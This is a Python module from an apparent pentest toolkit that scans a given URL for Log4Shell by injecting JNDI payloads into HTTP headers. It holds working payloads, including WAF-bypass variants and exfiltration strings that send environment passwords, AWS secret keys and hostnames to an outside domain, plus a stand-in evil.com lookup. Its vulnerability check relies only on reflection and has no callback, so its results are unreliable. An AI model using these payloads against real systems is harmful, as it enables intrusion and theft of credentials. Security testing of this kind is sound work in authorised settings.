#!/usr/bin/env python3
"""Modulo de deteccao de Log4Shell (CVE-2021-44228).

Testa se o servidor e vulneravel a Log4Shell via JNDI injection em
headers HTTP customizados:
  - jndi_basic — Payloads JNDI basicos (ldap, rmi, dns, ldaps, iiop)
  - jndi_obfuscated — Payloads ofuscados (lowercase, unicode, env vars)
  - header_injection — Headers vulneraveis (User-Agent, Referer, X-Forwarded-For)
  - data_exfil — Exfiltracao de dados via DNS (env vars, system props)
  - bypass — Bypass de WAF/filtros (nested, double wrap, exception-based)

Fluxo:
  1. Envia request baseline para obter resposta de referencia
  2. Envia requests com payloads JNDI em headers
  3. Verifica se o servidor processa ou reflete o payload
  4. Classifica: vulnerable, blocked, error
  5. Retorna resultado consolidado com severidade
"""

import argparse
import logging
import secrets
import string
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.log4shell")

_CATEGORY_MAP: dict[str, list[str]] = {
    "jndi_basic": ["ldap_basic", "rmi_basic", "dns_basic", "ldaps_basic", "iiop_basic"],
    "jndi_obfuscated": [
        "ldap_lower",
        "ldap_unicode",
        "ldap_envvar",
        "ldap_proplookup",
        "ldap_dollar",
    ],
    "header_injection": [
        "ua_jndi",
        "referer_jndi",
        "xff_jndi",
        "xapi_jndi",
        "auth_jndi",
    ],
    "data_exfil": [
        "exfil_hostname",
        "exfil_username",
        "exfil_password",
        "exfil_sysprop",
        "exfil_env",
    ],
    "bypass": [
        "bypass_nested",
        "bypass_doublewrap",
        "bypass_exception",
        "bypass_newline",
        "bypass_chunked",
    ],
}

_TOKEN: str | None = None


def _get_token() -> str:
    """Gera token unico por scan (lazy)."""
    global _TOKEN
    if _TOKEN is None:
        _TOKEN = "".join(
            secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12)
        )
    return _TOKEN


def _build_jndi_payload(protocol: str, token: str) -> str:
    """Constrói payload JNDI com token para deteccao."""
    return "${jndi:" + protocol + "://" + token + ".log4shell-test.com/a}"


async def _test_baseline(
    client: httpx.AsyncClient, url: str
) -> tuple[int, int, dict[str, str], bytes]:
    """Envia request baseline para obter status, tamanho, headers e corpo."""
    try:
        resp = await client.get(url, follow_redirects=True)
        return resp.status_code, len(resp.content), dict(resp.headers), resp.content
    except httpx.RequestError:
        return 0, 0, {}, b""


async def _test_jndi_basic(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, dict[str, str], bytes] | None = None,
) -> list[Log4ShellAttempt]:
    """Testa payloads JNDI basicos."""
    results: list[Log4ShellAttempt] = []
    if baseline is None:
        baseline = await _test_baseline(client, url)
    _b_status, _b_size, _b_headers, _b_body = baseline
    baseline_lower = _b_body.decode("utf-8", errors="ignore").lower()

    test_cases: list[tuple[str, str, str]] = [
        ("ldap_basic", "User-Agent", _build_jndi_payload("ldap", _get_token())),
        ("rmi_basic", "Referer", _build_jndi_payload("rmi", _get_token())),
        ("dns_basic", "X-Forwarded-For", _build_jndi_payload("dns", _get_token())),
        ("ldaps_basic", "X-Real-IP", _build_jndi_payload("ldaps", _get_token())),
        ("iiop_basic", "X-Api-Key", _build_jndi_payload("iiop", _get_token())),
    ]

    for technique, header_name, payload in test_cases:
        try:
            resp = await client.get(
                url, headers={header_name: payload}, follow_redirects=True
            )
            resp_body = resp.content.decode("utf-8", errors="ignore")

            vulnerable = False
            details = ""

            if payload.lower() in resp_body.lower():
                vulnerable = True
                details = "JNDI payload refletido no body"
            elif ("log4j" in resp_body.lower() or "jndi" in resp_body.lower()) and (
                "log4j" not in baseline_lower and "jndi" not in baseline_lower
            ):
                vulnerable = True
                details = "Possivel log4j detectado na resposta"

            results.append(
                Log4ShellAttempt(
                    exploit="${jndi:ldap://evil.com/a}",
                    tool="log4j-scan",
                    technique=technique,
                    category="jndi_basic",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=resp.status_code,
                    size=len(resp.content),
                    vulnerable=vulnerable,
                    details=details,
                    error="",
                )
            )
        except httpx.RequestError as e:
            results.append(
                Log4ShellAttempt(
                    technique=technique,
                    category="jndi_basic",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=0,
                    size=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )
    return results


async def _test_jndi_obfuscated(
    client: httpx.AsyncClient,
    url: str,
) -> list[Log4ShellAttempt]:
    """Testa payloads JNDI ofuscados."""
    results: list[Log4ShellAttempt] = []

    test_cases: list[tuple[str, str, str]] = [
        (
            "ldap_lower",
            "User-Agent",
            "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
        ),
        (
            "ldap_unicode",
            "User-Agent",
            "${j${}ndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
        ),
        (
            "ldap_envvar",
            "User-Agent",
            "${jndi:ldap://" + _get_token() + ".${env:USER}.log4shell-test.com/a}",
        ),
        (
            "ldap_proplookup",
            "User-Agent",
            "${jndi:ldap://" + _get_token() + ".${java:os.name}.log4shell-test.com/a}",
        ),
        (
            "ldap_dollar",
            "User-Agent",
            "${jndi:ldap://" + _get_token() + ".log4shell-test.com/${sys:user.dir}}",
        ),
    ]

    for technique, header_name, payload in test_cases:
        try:
            resp = await client.get(
                url, headers={header_name: payload}, follow_redirects=True
            )
            resp_body = resp.content.decode("utf-8", errors="ignore")

            vulnerable = False
            details = ""

            if _get_token().lower() in resp_body.lower():
                vulnerable = True
                details = "Ofuscado payload refletido no body"

            results.append(
                Log4ShellAttempt(
                    exploit="${jndi:ldap://evil.com/a}",
                    tool="log4j-scan",
                    technique=technique,
                    category="jndi_obfuscated",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=resp.status_code,
                    size=len(resp.content),
                    vulnerable=vulnerable,
                    details=details,
                    error="",
                )
            )
        except httpx.RequestError as e:
            results.append(
                Log4ShellAttempt(
                    technique=technique,
                    category="jndi_obfuscated",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=0,
                    size=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )
    return results


async def _test_header_injection(
    client: httpx.AsyncClient,
    url: str,
) -> list[Log4ShellAttempt]:
    """Testa injection via headers vulneraveis."""
    results: list[Log4ShellAttempt] = []
    payload = _build_jndi_payload("ldap", _get_token())

    test_cases: list[tuple[str, str]] = [
        ("ua_jndi", "User-Agent"),
        ("referer_jndi", "Referer"),
        ("xff_jndi", "X-Forwarded-For"),
        ("xapi_jndi", "X-Api-Key"),
        ("auth_jndi", "Authorization"),
    ]

    for technique, header_name in test_cases:
        try:
            resp = await client.get(
                url, headers={header_name: payload}, follow_redirects=True
            )
            resp_body = resp.content.decode("utf-8", errors="ignore")

            vulnerable = False
            details = ""

            if payload.lower() in resp_body.lower():
                vulnerable = True
                details = f"JNDI via {header_name} refletido"
            elif _get_token().lower() in resp_body.lower():
                vulnerable = True
                details = f"Token via {header_name} encontrado"

            results.append(
                Log4ShellAttempt(
                    exploit="${jndi:ldap://evil.com/a}",
                    tool="log4j-scan",
                    technique=technique,
                    category="header_injection",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=resp.status_code,
                    size=len(resp.content),
                    vulnerable=vulnerable,
                    details=details,
                    error="",
                )
            )
        except httpx.RequestError as e:
            results.append(
                Log4ShellAttempt(
                    technique=technique,
                    category="header_injection",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=0,
                    size=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )
    return results


async def _test_data_exfil(
    client: httpx.AsyncClient,
    url: str,
) -> list[Log4ShellAttempt]:
    """Testa exfiltracao de dados via DNS."""
    results: list[Log4ShellAttempt] = []

    test_cases: list[tuple[str, str, str]] = [
        (
            "exfil_hostname",
            "User-Agent",
            "${jndi:ldap://" + _get_token() + ".${hostName}.log4shell-test.com/a}",
        ),
        (
            "exfil_username",
            "Referer",
            "${jndi:ldap://" + _get_token() + ".${env:USER}.log4shell-test.com/a}",
        ),
        (
            "exfil_password",
            "X-Forwarded-For",
            "${jndi:ldap://" + _get_token() + ".${env:PASSWORD}.log4shell-test.com/a}",
        ),
        (
            "exfil_sysprop",
            "X-Real-IP",
            "${jndi:ldap://" + _get_token() + ".${java:os.name}.log4shell-test.com/a}",
        ),
        (
            "exfil_env",
            "X-Api-Key",
            "${jndi:ldap://"
            + _get_token()
            + ".${env:AWS_SECRET_KEY}.log4shell-test.com/a}",
        ),
    ]

    for technique, header_name, payload in test_cases:
        try:
            resp = await client.get(
                url, headers={header_name: payload}, follow_redirects=True
            )
            resp_body = resp.content.decode("utf-8", errors="ignore")

            vulnerable = False
            details = ""

            if _get_token().lower() in resp_body.lower():
                vulnerable = True
                details = f"Exfil payload refletido via {header_name}"

            results.append(
                Log4ShellAttempt(
                    exploit="${jndi:ldap://evil.com/a}",
                    tool="log4j-scan",
                    technique=technique,
                    category="data_exfil",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=resp.status_code,
                    size=len(resp.content),
                    vulnerable=vulnerable,
                    details=details,
                    error="",
                )
            )
        except httpx.RequestError as e:
            results.append(
                Log4ShellAttempt(
                    technique=technique,
                    category="data_exfil",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=0,
                    size=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )
    return results


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
) -> list[Log4ShellAttempt]:
    """Testa bypass de WAF/filtros."""
    results: list[Log4ShellAttempt] = []

    test_cases: list[tuple[str, str, str]] = [
        (
            "bypass_nested",
            "User-Agent",
            "${jndi:${lower:l}dap://" + _get_token() + ".log4shell-test.com/a}",
        ),
        (
            "bypass_doublewrap",
            "User-Agent",
            "${jndi:${::-j}${::-n}${::-d}i:ldap://"
            + _get_token()
            + ".log4shell-test.com/a}",
        ),
        (
            "bypass_exception",
            "User-Agent",
            "${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
        ),
        (
            "bypass_newline",
            "Referer",
            "test%0d%0a${jndi:ldap://" + _get_token() + ".log4shell-test.com/a}",
        ),
        (
            "bypass_chunked",
            "X-Forwarded-For",
            "test;"
            + chr(24)
            + "${jndi:ldap://"
            + _get_token()
            + ".log4shell-test.com/a}",
        ),
    ]

    for technique, header_name, payload in test_cases:
        try:
            resp = await client.get(
                url, headers={header_name: payload}, follow_redirects=True
            )
            resp_body = resp.content.decode("utf-8", errors="ignore")

            vulnerable = False
            details = ""

            if _get_token().lower() in resp_body.lower():
                vulnerable = True
                details = f"Bypass payload refletido via {header_name}"

            results.append(
                Log4ShellAttempt(
                    exploit="${jndi:ldap://evil.com/a}",
                    tool="log4j-scan",
                    technique=technique,
                    category="bypass",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=resp.status_code,
                    size=len(resp.content),
                    vulnerable=vulnerable,
                    details=details,
                    error="",
                )
            )
        except httpx.RequestError as e:
            results.append(
                Log4ShellAttempt(
                    technique=technique,
                    category="bypass",
                    header_name=header_name,
                    payload=payload,
                    token=_get_token(),
                    status=0,
                    size=0,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )
    return results


@dataclass(frozen=True, slots=True)
class Log4ShellAttempt:
    """Tentativa individual de Log4Shell."""

    technique: str
    category: str
    header_name: str
    payload: str
    token: str
    status: int
    size: int
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class Log4ShellResult:
    """Resultado consolidado do scan de Log4Shell."""

    target: str
    tls: bool
    attempts: list[Log4ShellAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def print_results(result: Log4ShellResult) -> None:
    """Exibe os resultados do scan de Log4Shell."""
    vuln = [a for a in result.attempts if a.vulnerable]
    blocked = [a for a in result.attempts if not a.vulnerable and not a.error]
    errors = [a for a in result.attempts if a.error]

    print(color("\n--- Log4Shell (CVE-2021-44228) ---", Cyber.CYAN, Cyber.BOLD))
    print(color(f"  Alvo:         {result.target}", Cyber.WHITE))
    print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))
    print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))
    print(color(f"  Vulneraveis:  {len(vuln)}", Cyber.GREEN if vuln else Cyber.GRAY))
    print(color(f"  Bloqueados:   {len(blocked)}", Cyber.GRAY))
    print(color(f"  Erros:        {len(errors)}", Cyber.RED if errors else Cyber.GRAY))

    if vuln:
        print(color("\n  [+] Vulnerabilidades detectadas:", Cyber.GREEN, Cyber.BOLD))
        seen: set[str] = set()
        for a in vuln:
            key = f"{a.technique}:{a.header_name}"
            if key in seen:
                continue
            seen.add(key)
            print(color(f"    [{a.category}] {a.technique}", Cyber.GREEN))
            print(color(f"      Header: {a.header_name}", Cyber.WHITE))
            print(color(f"      Status: {a.status}", Cyber.WHITE))
            if a.details:
                print(color(f"      Detalhes: {a.details}", Cyber.GRAY))
            print_exploit_info(a.exploit, a.tool)
        print(
            color(
                f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis",
                Cyber.WHITE,
            )
        )
    else:
        print(color("\n  [-] Nenhum Log4Shell detectado", Cyber.YELLOW))

    if result.issues:
        print(color("\n  [!] Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    output_file: str | None,
    proxy: str | None = None,
    json_output: bool = False,
) -> int:
    """Executa o scan de Log4Shell."""
    logger.info("Log4Shell scan para %s", target)

    tls = target.startswith("https://")

    async with create_async_client(timeout=timeout, proxy=proxy) as client:
        all_attempts: list[Log4ShellAttempt] = []
        test_categories = categories if categories else list(_CATEGORY_MAP.keys())

        baseline = None
        if "jndi_basic" in test_categories:
            baseline = await _test_baseline(client, target)

        for cat in test_categories:
            if cat == "jndi_basic":
                all_attempts.extend(await _test_jndi_basic(client, target, baseline))
            elif cat == "jndi_obfuscated":
                all_attempts.extend(await _test_jndi_obfuscated(client, target))
            elif cat == "header_injection":
                all_attempts.extend(await _test_header_injection(client, target))
            elif cat == "data_exfil":
                all_attempts.extend(await _test_data_exfil(client, target))
            elif cat == "bypass":
                all_attempts.extend(await _test_bypass(client, target))

        vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
        blocked_techs = list(
            {a.technique for a in all_attempts if not a.vulnerable and not a.error}
        )
        issues: list[str] = []

        if not vuln_techs and not blocked_techs:
            issues.append("Nenhum teste retornou resultado claro")

        result = Log4ShellResult(
            target=target,
            tls=tls,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked_techs,
            issues=issues,
            overall_status="vulnerable"
            if vuln_techs
            else ("safe" if blocked_techs else "unknown"),
        )

        if json_output:
            print_json(asdict(result))
        else:
            print_results(result)
        logger.info(
            "Log4Shell scan concluido: %d testes, %d vulneraveis",
            len(all_attempts),
            len(vuln_techs),
        )

        if output_file:
            write_output(output_file, asdict(result))
            logger.info("Resultados salvos em %s", output_file)

        return 1 if vuln_techs else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""
    art = r"""
    _    ___  _     ___   ____   ___       _   _  ___  ____  ____
   | |  / _ \| |   / _ \ / ___| |_ _|_ _| | | |/ _ \|  _ \|  _ \
   | |_| | | | |  | | | | |  _  | || '_| | | | | | | | | | | | | |
   |  _  |_| | |__| |_| | |_| | | || | | | |_| | |_| | |_| | |_| |
   |_|  \___/|_____\___/ \____|_|___|_|  \___/ \___/|____/|____/
"""
    create_banner(
        art,
        f"   log4shell: jndi_basic, obfuscated, header, exfil, bypass [{_get_token()}]",
    )()


def build_parser() -> argparse.ArgumentParser:
    """Construtor do parser de argumentos."""
    parser = argparse.ArgumentParser(
        prog="mytools-log4shell",
        description="Log4Shell — testa JNDI injection em headers HTTP (CVE-2021-44228).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  mytools-log4shell https://target.com\n"
            "  mytools-log4shell https://target.com -c jndi_basic\n"
            "  mytools-log4shell https://target.com -c header_injection\n"
            "  mytools-log4shell https://target.com --proxy http://127.0.0.1:8080"
        ),
    )
    parser.add_argument("url", help="URL alvo para o scan")
    parser.add_argument(
        "-c",
        "--category",
        default="all",
        choices=[
            "all",
            "jndi_basic",
            "jndi_obfuscated",
            "header_injection",
            "data_exfil",
            "bypass",
        ],
        help="Categoria de testes (default: todas)",
    )
    add_common_args(parser, "web")
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan Log4Shell a partir de argumentos parseados."""
    init_scanner(args)
    logger.info("Log4Shell scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None) and args.category != "all":
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            output_file=getattr(args, "output", None),
            proxy=getattr(args, "proxy", None),
            json_output=getattr(args, "json_output", False),
        ),
    )


def main() -> int:
    """Entry point do modulo Log4Shell."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="log4shell> ",
        description="Log4Shell interativo.",
        example="https://target.com -c jndi_basic",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c jndi_basic\n"
            "  https://target.com -c header_injection\n"
            "  https://target.com -c bypass\n"
            "  https://target.com --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
